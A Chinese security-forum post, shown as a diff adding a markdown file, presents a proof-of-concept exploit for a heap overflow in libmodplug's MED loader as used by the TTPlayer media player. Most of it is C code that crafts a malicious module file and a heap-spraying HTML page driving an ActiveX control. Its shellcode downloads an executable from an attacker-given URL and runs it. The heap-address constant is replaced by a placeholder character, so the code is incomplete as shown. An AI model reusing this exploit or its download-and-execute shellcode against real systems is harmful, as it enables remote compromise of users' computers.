@@ -1,0 +1,295 @@
+
+# 千千静听 med 文件格式堆溢出利用
+
+> 原文：[`www.pediy.com/kssd/pediy10/62200.html`](https://www.pediy.com/kssd/pediy10/62200.html)
+
+上个月看的洞，昨天晚上又重新翻看了一下这个洞，终于看到了成功利用的可能性。
+
+远程和本地攻击最后都可以，本地攻击成功比较低一些，头疼。
+
+详细的利用代码不贴了，详细可以看看 `libmod` 的源码
+
+下面是远程部分 `poc`, 2 个关键 `DWORD` 值隐藏了.![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")
+
+代码:
+
+```
+/*
+libmodplug v0.8
+  load_med.cpp
+  BOOL CSoundFile::ReadMed(const BYTE *lpStream, DWORD dwMemLength)
+    line 670: memcpy(m_lpszSongComments, lpStream+annotxt, annolen);
+
+千千静听使用的是 libmod 来进行 mod 类文件格式的处理, 此库在 ReadMed 函数中，没有检查
+文件描述的长度，如果传递一个恶意构造的值，将导致堆溢出。
+现在采用 libmod 软件很多，都应该存在此问题。
+
+*/
+
+/*
+  author: dummy
+  e-mail: dummyz@126.com
+
+  date: 2008/02/25
+*/
+
+#include <windows.h>
+#include <stdio.h>
+
+#pragma pack(1)
+
+typedef struct tagMEDMODULEHEADER
+{
+  DWORD id;    // MMD1-MMD3
+  DWORD modlen;  // Size of file
+  DWORD song;    // Position in file for this song
+  WORD psecnum;
+  WORD pseq;
+  DWORD blockarr;  // Position in file for blocks
+  DWORD mmdflags;
+  DWORD smplarr;  // Position in file for samples
+  DWORD reserved;
+  DWORD expdata;  // Absolute offset in file for ExpData (0 if not present)
+  DWORD reserved2;
+  WORD pstate;
+  WORD pblock;
+  WORD pline;
+  WORD pseqnum;
+  WORD actplayline;
+  BYTE counter;
+  BYTE extra_songs;  // # of songs - 1
+} MEDMODULEHEADER;
+
+typedef struct tagMMD0SAMPLE
+{
+  WORD rep, replen;
+  BYTE midich;
+  BYTE midipreset;
+  BYTE svol;
+  signed char strans;
+} MMD0SAMPLE;
+
+// MMD0/MMD1 song header
+typedef struct tagMMD0SONGHEADER
+{
+  MMD0SAMPLE sample[63];
+  WORD numblocks;    // # of blocks
+  WORD songlen;    // # of entries used in playseq
+  BYTE playseq[256];  // Play sequence
+  WORD deftempo;    // BPM tempo
+  signed char playtransp;  // Play transpose
+  BYTE flags;      // 0x10: Hex Volumes | 0x20: ST/NT/PT Slides | 0x40: 8 Channels song
+  BYTE flags2;    // [b4-b0]+1: Tempo LPB, 0x20: tempo mode, 0x80: mix_conv=on
+  BYTE tempo2;    // tempo TPL
+  BYTE trkvol[16];  // track volumes
+  BYTE mastervol;    // master volume
+  BYTE numsamples;  // # of samples (max=63)
+} MMD0SONGHEADER;
+
+typedef struct tagMMD0EXP
+{
+  DWORD nextmod;      // File offset of next Hdr
+  DWORD exp_smp;      // Pointer to extra instrument data
+  WORD s_ext_entries;    // Number of extra instrument entries
+  WORD s_ext_entrsz;    // Size of extra instrument data
+  DWORD annotxt;
+  DWORD annolen;
+  DWORD iinfo;      // Instrument names
+  WORD i_ext_entries;  
+  WORD i_ext_entrsz;
+  DWORD jumpmask;
+  DWORD rgbtable;
+  BYTE channelsplit[4];  // Only used if 8ch_conv (extra channel for every nonzero entry)
+  DWORD n_info;
+  DWORD songname;      // Song name
+  DWORD songnamelen;
+  DWORD dumps;
+  DWORD mmdinfo;
+  DWORD mmdrexx;
+  DWORD mmdcmd3x;
+  DWORD trackinfo_ofs;  // ptr to song->numtracks ptrs to tag lists
+  DWORD effectinfo_ofs;  // ptr to group ptrs
+  DWORD tag_end;
+} MMD0EXP;
+
+#pragma pack()
+
+// Byte swapping functions from the GNU C Library and libsdl
+
+/* Swap bytes in 16 bit value.  */
+#ifdef __GNUC__
+# define bswap_16(x) \
+    (__extension__                    \
+     ({ unsigned short int __bsx = (x);                \
+        (((( __bsx) >> 8) & 0xff) | ((( __bsx) & 0xff) << 8)); }))
+#else
+static __inline unsigned short int
+bswap_16 (unsigned short int __bsx)
+{
+  return (((( __bsx) >> 8) & 0xff) | ((( __bsx) & 0xff) << 8));
+}
+#endif
+
+/* Swap bytes in 32 bit value.  */
+#ifdef __GNUC__
+# define bswap_32(x) \
+    (__extension__                    \
+     ({ unsigned int __bsx = (x);                \
+        (((( __bsx) & 0xff000000) >> 24) | ((( __bsx) & 0x00ff0000) >>  8) |    \
+  ((( __bsx) & 0x0000ff00) <<  8) | ((( __bsx) & 0x000000ff) << 24)); }))
+#else
+static __inline unsigned int
+bswap_32 (unsigned int __bsx)
+{
+  return (((( __bsx) & 0xff000000) >> 24) | ((( __bsx) & 0x00ff0000) >>  8) |
+    ((( __bsx) & 0x0000ff00) <<  8) | ((( __bsx) & 0x000000ff) << 24));
+}
+#endif
+
+#ifdef WORDS_BIGENDIAN
+#define bswapLE16(X) bswap_16(X)
+#define bswapLE32(X) bswap_32(X)
+#define bswapBE16(X) (X)
+#define bswapBE32(X) (X)
+#else
+#define bswapLE16(X) (X)
+#define bswapLE32(X) (X)
+#define bswapBE16(X) bswap_16(X)
+#define bswapBE32(X) bswap_32(X)
+#endif
+
+#define FILE_SIZE_  0x30000
+// 远程攻击
+#if 0
+// 成功率很低
+#define NOP_    "\"%u090a\""
+#define HEAP_ADDR_  码
+#else
+// 成功率很高
+#define NOP_    "\"\""
+#define HEAP_ADDR_  码
+
+#endif
+
+const unsigned char shellcode[174] = 
+{
+  // 必须是偶数大小
+  0xE8, 0x00, 0x00, 0x00, 0x00, 0x6A, 0x03, 0xEB, 0x21, 0x7E, 0xD8, 0xE2, 0x73, 0x98, 0xFE, 0x8A, 
+  0x0E, 0x8E, 0x4E, 0x0E, 0xEC, 0x55, 0x52, 0x4C, 0x4D, 0x4F, 0x4E, 0x00, 0x00, 0x36, 0x1A, 0x2F, 
+  0x70, 0x63, 0x3A, 0x5C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x59, 0x5F, 0xAF, 0x67, 0x64, 0xA1, 
+  0x30, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0xAD, 0x8B, 0x68, 0x08, 0x51, 0x8B, 0x75, 0x3C, 
+  0x8B, 0x74, 0x2E, 0x78, 0x03, 0xF5, 0x56, 0x8B, 0x76, 0x20, 0x03, 0xF5, 0x33, 0xC9, 0x49, 0x41, 
+  0xAD, 0x03, 0xC5, 0x33, 0xDB, 0x0F, 0xBE, 0x10, 0x38, 0xF2, 0x74, 0x08, 0xC1, 0xCB, 0x0D, 0x03, 
+  0xDA, 0x40, 0xEB, 0xF1, 0x3B, 0x1F, 0x75, 0xE7, 0x5E, 0x8B, 0x5E, 0x24, 0x03, 0xDD, 0x66, 0x8B, 
+  0x0C, 0x4B, 0x8B, 0x5E, 0x1C, 0x03, 0xDD, 0x8B, 0x04, 0x8B, 0x03, 0xC5, 0xAB, 0x59, 0xE2, 0xBC, 
+  0x8B, 0x0F, 0x80, 0xF9, 0x63, 0x74, 0x0A, 0x57, 0xFF, 0xD0, 0x95, 0xAF, 0xAF, 0x6A, 0x01, 0xEB, 
+  0xAC, 0x52, 0x52, 0x57, 0x8D, 0x8F, 0xDB, 0x10, 0x40, 0x00, 0x81, 0xE9, 0x4E, 0x10, 0x40, 0x00, 
+  0x51, 0x52, 0xFF, 0xD0, 0x6A, 0x01, 0x57, 0xFF, 0x57, 0xEC, 0xFF, 0x57, 0xE8, 0x90
+};
+
+const char* script1 = \
+  "<html><body><object id=\"ttp\" classid=\"clsid:89AE5F82-410A-4040-9387-68D1144EFD03\"></object><script>"
+  "var sc=unescape(\"";
+const char* script2 = \
+  "\");"
+  "fb=unescape(" NOP_ ");"
+  "while(fb.length<0x30000)fb+=fb;"
+  "m=new Array();"
+  "for(x=0;x<400;x++)m[x]=sc+fb+sc;"
+  "setTimeout(\'ttp.URL=\"";
+const char* script3 = \
+  "\";ttp.controls.play();\', 3);</script>"
+  "</body>"
+  "</html>";
+
+void make_med_file(const char* path)
+{
+  MEDMODULEHEADER mmh;
+  MMD0SONGHEADER msh;
+  MMD0EXP mex;
+  FILE* file;
+  long p;
+
+  memset(&mmh, 0, sizeof (mmh));
+  memset(&msh, 0, sizeof (msh));
+  memset(&mex, 0, sizeof (mex));
+  
+  p = 0;
+
+  mmh.id = 0x30444D4D; // version = '0'
+
+  p +=  sizeof (MEDMODULEHEADER);
+  mmh.song = bswapBE32(p);
+
+  p += sizeof (MMD0SONGHEADER);
+  mmh.expdata = bswapBE32(p);
+  
+  p += sizeof (MMD0EXP);
+  mex.annolen = bswapBE32(-1);
+  mex.annotxt = bswapBE32(p);
+  
+  file = fopen(path, "wb+");
+  if ( file == NULL )
+  {
+    printf("create file failed!\n");
+    exit(0);
+  }
+  else
+  {
+    fwrite(&mmh, 1, sizeof (mmh), file);
+    fwrite(&msh, 1, sizeof (msh), file);
+    fwrite(&mex, 1, sizeof (mex), file);
+    
+    while ( ftell(file) < FILE_SIZE_ )
+    {
+      fwrite(HEAP_ADDR_, 1, 4, file);
+    }
+    
+    fclose(file);
+    printf("successed!\n");
+  }
+}
+
+void make_htlm_file(const char* htmlpath, const char* s3mpath, const char* url)
+{
+  FILE *file = fopen(htmlpath, "w+");
+  if ( file == NULL )
+  {
+    printf("create '%s' failed!\n", htmlpath);
+    exit(0);
+  }
+
+  fprintf(file, "%s", script1);
+  for ( unsigned i = 0; i < sizeof (shellcode); i += 2 )
+    fprintf(file, "%%u%02X%02X" , shellcode[i + 1], shellcode[i]);
+  
+  const unsigned l = strlen(url);
+  for ( unsigned j = 0; j < l; j += 2 )
+    fprintf(file, "%%u%02X%02X" , url[j + 1], url[j]);
+  
+  fprintf(file, "%s%s%s", script2, s3mpath, script3);
+  fclose(file);
+  
+  printf("make '%s' successed!\n", htmlpath);
+}
+
+int main(int argc, char* argv[])
+{
+  printf("ttplayer stack exp poc by dummyz@126.com\n");
+  if ( argc <= 1 )
+  {
+    printf("need argv!(ex: %s http://xxx.xxx/xx.exe\n", argv[0]);
+    return -1;
+  }
+  
+  printf("+ make_med_file...\n");
+  make_med_file("c:\\\\shit.s3m");
+
+  printf("+ make_htlm_file...\n");
+  make_htlm_file("poc.html", "c://shit.s3m", argv[1]);
+
+  printf("done.\n");
+
+  return 0;
+}
+```
